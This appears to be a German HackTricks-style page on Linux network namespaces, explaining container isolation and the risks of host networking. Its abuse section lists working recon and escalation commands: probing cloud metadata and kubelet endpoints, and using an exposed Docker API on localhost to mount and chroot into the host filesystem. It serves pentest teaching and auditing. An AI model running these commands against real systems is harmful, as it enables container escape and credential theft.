# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Interfaces, IP-Adressen, Routing-Tabellen, ARP/neighbor-Zustand, Firewall-Regeln, Sockets und den Inhalt von Dateien wie `/proc/net`. Deshalb kann ein Container so aussehen, als hätte er sein eigenes `eth0`, eigene lokale Routen und ein eigenes Loopback-Gerät, ohne den echten Netzwerkstack des Hosts zu besitzen.

Aus Sicht der Sicherheit ist das wichtig, denn Netzwerkisolation umfasst weit mehr als nur Port-Binding. Ein privater Netzwerk-Namespace begrenzt, was der Workload direkt beobachten oder neu konfigurieren kann. Sobald dieser Namespace mit dem Host geteilt wird, kann der Container plötzlich Einsicht in Host-Listener, host-lokale Services und Netzwerk-Kontrollpunkte erhalten, die niemals für die Anwendung freigegeben werden sollten.

## Funktionsweise

Ein frisch erstellter Netzwerk-Namespace beginnt mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Interfaces daran angebunden werden. Container-Runtimes erzeugen oder verbinden dann virtuelle Interfaces, weisen Adressen zu und konfigurieren Routen, damit der Workload die erwartete Konnektivität hat. In bridge-basierten Deployments bedeutet das üblicherweise, dass der Container ein veth-gestütztes Interface sieht, das mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die entsprechende Einrichtung für Pod networking.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so drastische Änderung darstellt. Anstatt einen vorbereiteten privaten Netzwerkstack zu erhalten, tritt der Workload dem tatsächlichen Netzwerkstack des Hosts bei.

## Labor

Du kannst einen nahezu leeren Netzwerk-Namespace sehen mit:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und du kannst normale Container und Container mit Host-Netzwerk vergleichen mit:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Ein Container, der das Host-Netzwerk nutzt, hat nicht mehr seine eigene isolierte Socket- und Schnittstellenansicht. Diese Änderung allein ist bereits bedeutsam, noch bevor man fragt, welche Fähigkeiten der Prozess besitzt.

## Laufzeitnutzung

Docker und Podman erstellen normalerweise einen privaten Netzwerk-Namespace für jeden Container, sofern nicht anders konfiguriert. Kubernetes gibt üblicherweise jedem Pod seinen eigenen Netzwerk-Namespace, den die Container innerhalb dieses Pods teilen, der aber vom Host getrennt ist. Incus/LXC-Systeme bieten ebenfalls reichhaltige netzwerk-namespace-basierte Isolation, oft mit einer größeren Vielfalt an virtuellen Netzwerk-Setups.

Das gemeinsame Prinzip ist, dass private Netzwerke die standardmäßige Isolationsgrenze sind, während Host-Networking eine explizite Abkehr von dieser Grenze darstellt.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist schlicht das Teilen des Host-Netzwerk-Namespaces. Das geschieht manchmal aus Performance-, Low-Level-Monitoring- oder Komfortgründen, entfernt aber eine der saubersten Grenzen, die Containern zur Verfügung stehen. Host-lokale Listener werden direkter erreichbar, localhost-only Dienste können zugänglich werden, und Capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden deutlich gefährlicher, weil die durch sie erlaubten Operationen nun auf die Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist das zu großzügige Zuweisen netzwerkbezogener Capabilities, selbst wenn der Netzwerk-Namespace privat ist. Ein privater Namespace hilft zwar, macht aber raw sockets oder fortgeschrittene Netzwerksteuerung nicht harmlos.

## Missbrauch

In schwach isolierten Setups können Angreifer Host-listening-Services inspizieren, Management-Endpunkte erreichen, die nur an loopback gebunden sind, den Verkehr sniffen oder stören — je nach den konkreten Capabilities und der Umgebung — oder Routing- und Firewall-Zustände neu konfigurieren, wenn `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann das außerdem lateral movement und control-plane reconnaissance erleichtern.

Wenn Sie Host-Networking vermuten, beginnen Sie damit zu bestätigen, dass die sichtbaren Schnittstellen und Listener dem Host gehören und nicht einem isolierten Container-Netzwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only-Dienste sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Wenn Netzwerkfähigkeiten vorhanden sind, prüfen Sie, ob der Workload den sichtbaren Stack inspizieren oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Networking ebenfalls eine schnelle lokale recon von Metadaten und control-plane-nahen Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Vollständiges Beispiel: Host Networking + Local Runtime / Kubelet Access

Host networking gewährt nicht automatisch host root, bringt jedoch oft Dienste zum Vorschein, die absichtlich nur vom node selbst erreichbar sind. Wenn einer dieser Dienste schwach geschützt ist, wird Host networking zu einem direkten privilege-escalation-Pfad.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- Direkte Kompromittierung des Hosts, wenn eine lokale Runtime-API ohne angemessenen Schutz exponiert ist
- Cluster-Aufklärung oder laterale Bewegung, wenn kubelet oder lokale Agenten erreichbar sind
- Verkehrsmanipulation oder Denial of Service, wenn kombiniert mit `CAP_NET_ADMIN`

## Prüfungen

Das Ziel dieser Prüfungen ist herauszufinden, ob der Prozess einen privaten Netzwerk-Stack hat, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits host-ähnlich aussieht, bevor Sie überhaupt Capabilities testen.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Was hier interessant ist:

- Wenn die Namespace-Kennung oder die sichtbaren Schnittstellen wie beim Host aussehen, könnte Host-Netzwerk bereits verwendet werden.
- `ss -lntup` ist besonders wertvoll, da es nur auf Loopback hörende Listener und lokale Management-Endpunkte aufdeckt.
- Routen, Schnittstellennamen und Firewall-Kontext werden deutlich wichtiger, wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden sind.

Bei der Überprüfung eines Containers sollte das Netzwerk-Namespace stets zusammen mit dem Capability-Set bewertet werden. Host-Netzwerk plus starke Netzwerk-Capabilities ist eine ganz andere Sicherheitslage als Bridge-Netzwerk plus ein enges Standard-Capability-Set.
{{#include ../../../../../banners/hacktricks-training.md}}
